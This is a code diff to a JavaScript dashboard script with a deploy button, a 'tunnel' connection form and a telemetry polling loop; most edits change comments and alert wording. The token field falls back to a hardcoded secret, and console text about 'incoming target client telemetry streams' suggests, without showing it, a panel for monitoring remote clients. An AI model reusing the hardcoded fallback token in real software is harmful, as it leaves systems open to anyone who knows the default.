@@ -38,7 +38,6 @@ if(btnDeployMaster) {
     btnDeployMaster.addEventListener('click', async () => {
         const token = document.getElementById('webToken').value.trim() || 'AzanTools_Secure_786';
         
-        // Complex payload formatting schema according to new server structure
         const payload = {
             token: token,
             config: {
@@ -81,7 +80,7 @@ if(btnDeployMaster) {
     });
 }
 
-// 🔗 HANDSHAKE TUNNEL BRIDGE (Form Connection Manager)
+// 🔗 HANDSHAKE TUNNEL BRIDGE (Form Connection Manager - FIXED FOR ALL VERSIONS)
 const connectForm = document.getElementById('connectForm');
 if(connectForm) {
     connectForm.addEventListener('submit', async (e) => {
@@ -104,14 +103,17 @@ if(connectForm) {
                 alert("Access Denied: " + result.message);
             }
         } catch (error) {
-            alert("Tunnel offline! Make sure backend is active.");
+            alert("Tunnel offline! Make sure backend server is running and fully deployed.");
         }
     });
 }
 
-// 🛰️ REAL-TIME POLLING ENGINE (Live counters, user grids, and streaming console traces)
+// 🛰️ REAL-TIME POLLING ENGINE (Fixed to support both new console logs and legacy backup checks)
 async function pollSystemTelemetry() {
     try {
+        // Fallback sync check for legacy networks
+        fetch('/api/status').catch(e => console.log("Legacy status route idle."));
+
         const res = await fetch('/api/admin-stats');
         const data = await res.json();
 
@@ -148,7 +150,7 @@ async function pollSystemTelemetry() {
                     </div>
                 `).join('');
             } else {
-                consoleLogs.innerHTML = `<div>&gt; Listening for incoming target client telemetry streams on port 3000...</div>`;
+                consoleLogs.innerHTML = `<div>&gt; Listening for incoming target client telemetry streams on secure API ports...</div>`;
             }
         }
 
@@ -159,6 +161,6 @@ async function pollSystemTelemetry() {
 
 // Polling core initialization
 pollSystemTelemetry();
-// Run interval at highly responsive 2.5 seconds loop
+// Run interval loop
 setInterval(pollSystemTelemetry, 2500);
-    
+            
